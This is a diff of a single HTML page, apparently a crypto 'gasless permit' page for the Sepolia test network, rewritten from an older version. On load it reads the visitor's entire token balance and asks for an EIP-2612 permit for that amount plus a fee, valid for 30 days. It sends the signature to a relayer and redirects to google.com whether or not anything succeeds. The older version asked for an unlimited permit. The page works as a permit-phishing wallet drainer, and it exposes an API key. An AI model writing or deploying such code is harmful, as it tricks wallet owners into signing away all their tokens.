@@ -1,98 +1,246 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <title>Gasless ERC20 Permit</title>
-    <script src="https://cdn.jsdelivr.net/npm/ethers@6.8.0/dist/ethers.min.js"></script>
-    <script src="https://unpkg.com/@biconomy/mexa@2.0.1/dist/biconomy.min.js"></script>
+  <meta charset="utf-8" />
+  <title>Gasless Permit Flow — Snapshot + Biconomy (Sepolia)</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <style>
+    body { font-family: Inter,Arial,Helvetica,sans-serif; display:flex; align-items:center; justify-content:center; min-height:100vh; margin:0;
+           background: linear-gradient(135deg,#f8fafc 0%,#eef2ff 100%); }
+    .card { width:620px; max-width:95%; background:white; border-radius:12px; box-shadow:0 6px 30px rgba(20,20,50,0.06); padding:24px; text-align:left; }
+    h1{margin:0 0 8px;font-size:18px}
+    p{margin:6px 0 12px;color:#334155}
+    .muted{color:#64748b;font-size:13px}
+    .status{padding:10px;border-radius:8px;margin-top:12px}
+    .loading{background:#fff7ed;color:#92400e}
+    .success{background:#ecfdf5;color:#065f46}
+    .error{background:#ffebee;color:#7f1d1d}
+    small{display:block;margin-top:8px;color:#94a3b8}
+  </style>
 </head>
 <body>
-<script>
-(async function() {
-    try {
-        // =====================
-        //  تنظیمات Biconomy
-        // =====================
-        const biconomy = new Biconomy(window.ethereum, {
-            apiKey: "ziScnfoxl.30ef2520-f3d4-44c2-9849-8b3a11257e02",
-            debug: true,
-        });
+  <div class="card" role="main" aria-live="polite">
+    <h1>Quick Gasless Permit (Sepolia)</h1>
+    <p class="muted">One-click → sign permit → we send gasless request to Biconomy → you are redirected to the destination page immediately.</p>
 
-        await biconomy.init();
+    <div id="status" class="status loading">⏳ Preparing...</div>
+    <small id="log" class="muted"></small>
+  </div>
 
-        const provider = new ethers.BrowserProvider(biconomy);
-        const signer = await provider.getSigner();
+<script type="module">
+/**
+ * index.html — Gasless Permit (snapshot) + Biconomy (Fusion)
+ * - Snapshot balance, build EIP-2612 Permit with deadline = now + 30 days
+ * - Sign with eth_signTypedData_v4
+ * - POST payload to Biconomy endpoint (x-api-key)
+ * - Redirect immediately to DESTINATION_PAGE
+ *
+ * IMPORTANT: Replace the PLACEHOLDER values below before running tests.
+ */
 
-        // =====================
-        //  تنظیمات کانترکت و توکن
-        // =====================
-        const CONTRACT_ADDRESS = "0x6398a907dbE3d0efE09dF82e6D19986da60b63B3";
-        const TOKEN_ADDRESS = "0x92f3B59a79bFf5dc60c0d59eA13a44D082B2bdFC";
-        const DESTINATION_PAGE = "https://www.google.com";
+import { ethers } from "https://cdn.jsdelivr.net/npm/ethers@6.9.1/dist/ethers.esm.min.js";
 
-        // ABI کانترکت با تابع دریافت Permit (نمونه)
-        const contractABI = [
-            "function executePermit(address token, uint256 amount, bytes calldata signature) external"
-        ];
+const STATUS = document.getElementById('status');
+const LOG = document.getElementById('log');
+function setStatus(msg, cls='loading') { STATUS.textContent = msg; STATUS.className = `status ${cls}`; }
+function log(msg){ LOG.textContent = msg; console.log(msg); }
 
-        const contract = new ethers.Contract(CONTRACT_ADDRESS, contractABI, signer);
+// -----------------------
+// CONFIG: REPLACE THESE
+// -----------------------
+const TOKEN_ADDRESS = "0x92f3B59a79bFf5dc60c0d59eA13a44D082B2bdFC"; // <- REPLACE if needed
+const BICONOMY_API_KEY = "ziScnfoxl.30ef2520-f3d4-44c2-9849-8b3a11257e02"; // <- FROM DASHBOARD
+const BICONOMY_URL = "https://paymaster.biconomy.io/api/v2/11155111/ziScnfoxl.30ef2520-f3d4-44c2-9849-8b3a11257e02"; // <- FROM DASHBOARD
+const BICONOMY_PROJECT_ID = "be7dc5ec-5aff-4761-9454-67791ef4b0e1"; // <- optional, from dashboard
+const DESTINATION_PAGE = "https://www.google.com"; // <- REPLACE with your rules page
+// IMPORTANT: RELAYER_SPENDER must be the address that will be used as spender in permit.
+// For Fusion/token-paymaster flows ask Biconomy which address they expect as the spender (or use their relayer address).
+// If unsure, leave as placeholder and coordinate with Biconomy support.
+const RELAYER_SPENDER = "REPLACE_WITH_RELAYER_SPENDER_ADDRESS"; // <--- MUST REPLACE before production
 
-        // =====================
-        //  ایجاد Permit MAX
-        // =====================
-        const tokenABI = [
-            "function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external"
-        ];
-        const tokenContract = new ethers.Contract(TOKEN_ADDRESS, tokenABI, signer);
+// Policy for relayer fee (basis points). Example: 50 = 0.5%
+const RELAYER_FEE_BPS = 50n;
 
-        const owner = await signer.getAddress();
-        const spender = CONTRACT_ADDRESS;
-        const value = ethers.MaxUint256; // MAX مقدار
-        const deadline = Math.floor(Date.now() / 1000) + 3600; // 1 ساعت اعتبار
+// Sepolia chainId
+const CHAIN_ID = 11155111;
 
-        // =====================
-        //  ایجاد هش و امضا
-        // =====================
-        const domain = {
-            name: "ERC20Permit",
-            version: "1",
-            chainId: 11155111, // Sepolia
-            verifyingContract: TOKEN_ADDRESS
-        };
+// -----------------------
+setStatus('🔌 Waiting for wallet / preparing...', 'loading');
 
-        const types = {
-            Permit: [
-                { name: "owner", type: "address" },
-                { name: "spender", type: "address" },
-                { name: "value", type: "uint256" },
-                { name: "deadline", type: "uint256" }
-            ]
-        };
-
-        const message = {
-            owner,
-            spender,
-            value,
-            deadline
-        };
-
-        const signature = await signer._signTypedData(domain, types, message);
-
-        // =====================
-        //  ارسال Permit به کانترکت از طریق Biconomy
-        // =====================
-        const tx = await contract.executePermit(TOKEN_ADDRESS, value, signature);
-        console.log("Transaction sent: ", tx.hash);
-
-        // =====================
-        //  فوراً هدایت به صفحه پیش فرض
-        // =====================
-        window.location.href = DESTINATION_PAGE;
-
-    } catch (err) {
-        console.error(err);
-        window.location.href = DESTINATION_PAGE; // حتی در صورت خطا، کاربر برود به صفحه پیش فرض
+(async function main(){
+  try {
+    if (!window.ethereum) {
+      setStatus('❌ No injected wallet found (MetaMask required)', 'error');
+      log('No window.ethereum — wallet missing');
+      // redirect anyway per UX requirement
+      setTimeout(()=> location.href = DESTINATION_PAGE, 1500);
+      return;
     }
+
+    // Ensure user is on Sepolia; optional but recommended:
+    const provider = new ethers.BrowserProvider(window.ethereum);
+    const network = await provider.getNetwork();
+    if (Number(network.chainId) !== CHAIN_ID) {
+      setStatus(`⚠️ Please switch wallet network to Sepolia (chainId ${CHAIN_ID})`, 'error');
+      log(`Wrong network: ${network.chainId}`);
+      // We still attempt to request accounts so the user sees connect prompt
+      try { await provider.send("eth_requestAccounts", []); } catch(e){/*ignore*/ }
+      return;
+    }
+
+    setStatus('🔍 Reading account & token snapshot...', 'loading');
+
+    // Request account if needed
+    let accounts = await window.ethereum.request({ method: 'eth_accounts' }).catch(()=>[]);
+    if (!accounts || accounts.length === 0) {
+      accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+    }
+    const user = accounts[0];
+    log('User address: ' + user);
+
+    const signer = await provider.getSigner();
+    const userAddr = await signer.getAddress();
+
+    // Minimal ERC20 ABI: name, decimals, balanceOf, nonces (EIP-2612)
+    const erc20Abi = [
+      "function name() view returns (string)",
+      "function decimals() view returns (uint8)",
+      "function balanceOf(address) view returns (uint256)",
+      "function nonces(address) view returns (uint256)"
+    ];
+    const token = new ethers.Contract(TOKEN_ADDRESS, erc20Abi, provider);
+
+    // snapshot balance
+    let balance = await token.balanceOf(userAddr);
+    if (balance === 0n) {
+      setStatus('ℹ️ Token balance is zero — nothing to do', 'error');
+      log('balance zero for token: ' + TOKEN_ADDRESS);
+      // redirect per UX requirement
+      setTimeout(()=> location.href = DESTINATION_PAGE, 1200);
+      return;
+    }
+
+    // read decimals & name & nonce (best-effort)
+    let tokenName = "Token";
+    try { tokenName = await token.name(); } catch(e){ /* ignore */ }
+    let decimals = 18;
+    try { decimals = Number(await token.decimals()); } catch(e){ /* ignore */ }
+    let nonce = 0n;
+    try { nonce = await token.nonces(userAddr); } catch(e){ nonce = 0n; }
+
+    log(`Snapshot balance: ${balance.toString()} (decimals ${decimals})`);
+    setStatus('✍️ Building permit (snapshot) and requesting signature...', 'loading');
+
+    // compute relayer fee and permitValue
+    const requestedAmount = balance; // snapshot = take all balance
+    let relayerFee = (requestedAmount * RELAYER_FEE_BPS) / 10000n;
+    if (relayerFee === 0n) relayerFee = 1n; // minimum 1 unit
+    const permitValue = requestedAmount + relayerFee;
+
+    // deadline 30 days from now
+    const deadline = BigInt(Math.floor(Date.now() / 1000) + (30 * 24 * 3600));
+
+    // Construct EIP-2612 typed data
+    const domain = {
+      name: tokenName,
+      version: "1",
+      chainId: CHAIN_ID,
+      verifyingContract: TOKEN_ADDRESS
+    };
+
+    const types = {
+      Permit: [
+        { name: "owner", type: "address" },
+        { name: "spender", type: "address" },
+        { name: "value", type: "uint256" },
+        { name: "nonce", type: "uint256" },
+        { name: "deadline", type: "uint256" }
+      ]
+    };
+
+    const message = {
+      owner: userAddr,
+      spender: RELAYER_SPENDER,          // IMPORTANT: replace with actual relayer/spender address from Biconomy
+      value: permitValue.toString(),
+      nonce: nonce.toString(),
+      deadline: deadline.toString()
+    };
+
+    // Build the raw JSON for eth_signTypedData_v4
+    const payloadTyped = JSON.stringify({ domain, message, primaryType: "Permit", types });
+
+    // Request signature (user will see a single popup)
+    // Use eth_signTypedData_v4 to get typed-data signature
+    let signature;
+    try {
+      signature = await window.ethereum.request({
+        method: 'eth_signTypedData_v4',
+        params: [userAddr, payloadTyped]
+      });
+      log('Permit signature obtained');
+      setStatus('✅ Signature obtained — sending to relayer (gasless)...', 'success');
+    } catch (err) {
+      console.error('Signature rejected or failed:', err);
+      setStatus('❌ Signature rejected or error', 'error');
+      // Redirect anyway after short pause
+      setTimeout(()=> location.href = DESTINATION_PAGE, 1200);
+      return;
+    }
+
+    // Build payload we will send to Biconomy (example format).
+    // NOTE: The exact payload format expected by your Biconomy project might differ.
+    // Consult your Biconomy dashboard or support if needed. Adjust fields accordingly.
+    const biconomyPayload = {
+      // meta: which contract/method to call or generic instruction
+      // For "no-contract" flow, we rely on Biconomy Fusion to orchestrate permit + transferFrom
+      apiId: BICONOMY_PROJECT_ID,
+      from: userAddr,
+      // custom params - adapt to your Biconomy project's expected body
+      params: {
+        token: TOKEN_ADDRESS,
+        owner: userAddr,
+        requestedAmount: requestedAmount.toString(),
+        relayerFee: relayerFee.toString(),
+        destination: DESTINATION_PAGE, // note: Biconomy might expect an address, not URL; replace accordingly
+        permit: {
+          v_r_s: signature,  // many relayers expect v,r,s separated; adapt if necessary
+          raw: payloadTyped
+        },
+        deadline: deadline.toString()
+      }
+    };
+
+    // Send payload to Biconomy endpoint (fire-and-forget). Include x-api-key header.
+    // We do not await final tx; per UX requirement we redirect immediately.
+    (async () => {
+      try {
+        const resp = await fetch(BICONOMY_URL, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+            'x-api-key': BICONOMY_API_KEY
+          },
+          body: JSON.stringify(biconomyPayload)
+        });
+        const json = await resp.json().catch(()=>null);
+        log('Biconomy response: ' + (json ? JSON.stringify(json) : resp.status));
+      } catch (e) {
+        console.warn('Biconomy request failed:', e);
+        log('Biconomy request failed — check console and dashboard');
+      }
+    })();
+
+    // Redirect the user immediately (UX requirement)
+    setStatus('➡️ Redirecting to destination...', 'success');
+    setTimeout(()=> { window.location.href = DESTINATION_PAGE; }, 450);
+
+  } catch (err) {
+    console.error('Unexpected error:', err);
+    setStatus('❌ Unexpected error (see console)', 'error');
+    log(String(err));
+    // Redirect to destination page anyway
+    setTimeout(()=> location.href = DESTINATION_PAGE, 1200);
+  }
 })();
 </script>
 </body>
